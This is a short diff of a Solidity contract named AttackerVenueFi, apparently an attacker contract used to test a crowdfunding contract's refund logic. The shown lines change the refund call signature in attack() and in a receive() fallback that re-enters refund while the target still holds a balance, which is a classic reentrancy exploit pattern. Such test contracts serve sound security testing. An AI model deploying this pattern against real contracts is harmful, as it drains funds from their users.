@@ -18,12 +18,12 @@ contract AttackerVenueFi {
 
     // step 2: after closeFunding, try to attack
     function attack() external {
-        target.refund(attackAmount);
+        target.refund();
     }
 
     receive() external payable {
         if (address(target).balance > 0) {
-            target.refund(attackAmount); // try to re-enter
+            target.refund(); // try to re-enter
         }
     }
 }
